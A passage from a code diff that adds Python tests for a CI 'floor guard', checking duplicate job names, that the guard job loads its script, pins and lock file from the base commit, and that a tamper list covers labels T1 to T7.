+        "on: push\njobs:\n  x:\n    name: LINT (RUFF)\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n",
+        encoding="utf-8",
+    )
+    found = guard.violations(root)
+    assert any("produced by more than one job" in f for f in found), found
+
+
+def test_floor_guard_job_reads_guard_pins_and_lock_from_base() -> None:
+    run = _runs(_workflow()["jobs"]["floor-guard"])
+    for rel in (
+        "scripts/floor_guard.py",
+        ".github/floor-pins.json",
+        "requirements-ci.lock",
+    ):
+        assert f'git show "$BASE:{rel}"' in run, rel
+    assert "refusing to judge with the pull request copy" in run
+    assert '--pins "$RUNNER_TEMP/floor/floor-pins.json"' in run
+
+
+def test_the_tamper_list_covers_every_property() -> None:
+    keys = {label.split()[0] for label, *_ in TAMPERS}
+    assert keys == {"T1", "T2", "T3", "T4", "T5", "T6", "T7"}
